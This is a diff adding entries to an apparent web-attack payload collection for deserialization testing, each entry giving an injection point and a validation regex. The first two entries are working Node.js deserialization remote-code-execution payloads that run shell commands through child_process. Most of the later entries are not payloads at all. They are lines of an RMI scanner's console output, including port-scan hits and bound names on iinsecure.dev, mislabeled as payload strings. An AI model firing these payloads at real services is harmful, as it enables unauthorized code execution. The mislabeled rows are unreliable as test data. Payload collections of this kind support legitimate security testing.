@@ -41006,5 +41006,203 @@
       "expected_status_code": 200,
       "success_regex": ""
     }
+  },
+  {
+    "payload_id": "OWP-240862",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{\"rce\":\"_$$ND_FUNC$$_function(){require('child_process').exec('ls /', function(error,stdout, stderr) { console.log(stdout) });}()\"}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-240863",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "{\"rce\":{\"__js_function\":\"function(){CMD=\\\"cmd /c calc\\\";const process = this.constructor.constructor('return this.process')();process.mainModule.require('child_process').exec(CMD,function(error,stdout,stderr){console.log(stdout)});}()\"}}",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242525",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+] Scanning 6225 Ports on 172.17.0.2 for RMI services.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242526",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]  [HIT] Found RMI service(s) on 172.17.0.2:40393 (DGC)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242527",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]  [HIT] Found RMI service(s) on 172.17.0.2:1090  (Registry, DGC)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242528",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]  [HIT] Found RMI service(s) on 172.17.0.2:9010  (Registry, Activator, DGC)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242529",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]  [6234 / 6234] [#############################] 100%",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242530",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+] Portscan finished.",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242532",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+] RMI registry bound names:",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242533",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242534",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]  - plain-server2",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242535",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]   --> de.qtc.rmg.server.interfaces.IPlainServer (unknown class)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242536",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff7, 9040809218460289711]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242537",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]  - legacy-service",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242538",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]   --> de.qtc.rmg.server.legacy.LegacyServiceImpl_Stub (unknown class)",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242539",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ffc, 4854919471498518309]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242540",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]  - plain-server",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
+  },
+  {
+    "payload_id": "OWP-242541",
+    "vulnerability_category": "Software & Data Integrity Failures (Deserialization)",
+    "target_technology": "Generic",
+    "injection_point": "body_json",
+    "payload_string": "[+]       Endpoint: iinsecure.dev:39153 ObjID: [-af587e6:17d6f7bb318:-7ff8, 6721714394791464813]",
+    "validation": {
+      "expected_status_code": 200,
+      "success_regex": "unserialize|ObjectInputStream|pickle"
+    }
   }
 ]
